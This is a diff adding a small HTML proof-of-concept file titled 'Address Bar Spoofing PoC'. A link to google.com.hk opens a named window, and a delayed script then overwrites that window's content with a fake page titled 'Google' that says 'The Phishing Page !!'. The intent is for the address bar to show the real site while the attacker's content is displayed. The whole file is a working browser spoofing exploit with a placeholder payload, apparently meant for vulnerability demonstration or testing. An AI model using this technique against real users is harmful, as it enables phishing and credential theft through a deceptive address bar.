@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Address Bar Spoofing PoC</title>
+    <script>
+        function winopen() {
+            OW = window.open("", "newwin");
+            OW.document.write("<TITLE>Google</TITLE>");
+            OW.document.write("<h1>The Phishing Page !!</h1>");
+            OW.document.close();
+        }
+    </script>
+</head>
+<body>
+    <a href="https://www.google.com.hk/" target="newwin" onclick="setTimeout('winopen()', 1);">
+        Google Home Page
+    </a>
+</body>
+</html>
